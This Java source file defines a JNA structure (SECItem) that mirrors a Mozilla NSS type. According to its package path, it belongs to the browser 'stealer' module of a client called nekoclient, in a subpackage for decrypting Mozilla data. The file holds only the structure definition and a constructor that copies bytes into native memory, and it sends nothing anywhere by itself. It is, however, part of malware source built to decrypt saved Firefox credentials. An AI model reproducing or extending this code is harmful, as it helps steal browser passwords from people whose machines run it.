package dev.neko.nekoclient.api.stealer.browser.impl.decrypt.mozilla;

import com.sun.jna.Memory;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class SECItem extends Structure {
   public int type;
   public Pointer data;
   public int len;

   @Override
   protected List<String> getFieldOrder() {
      return Arrays.asList("type", "data", "len");
   }

   public static class ByReference extends SECItem implements Structure.ByReference {
      public ByReference(int type, byte[] data, int len) {
         this.type = type;
         this.len = len;
         if (Objects.isNull(data)) {
            this.data = null;
         } else {
            Memory memory = new Memory((long)data.length);
            memory.write(0L, data, 0, data.length);
            this.data = memory;
         }
      }
   }
}
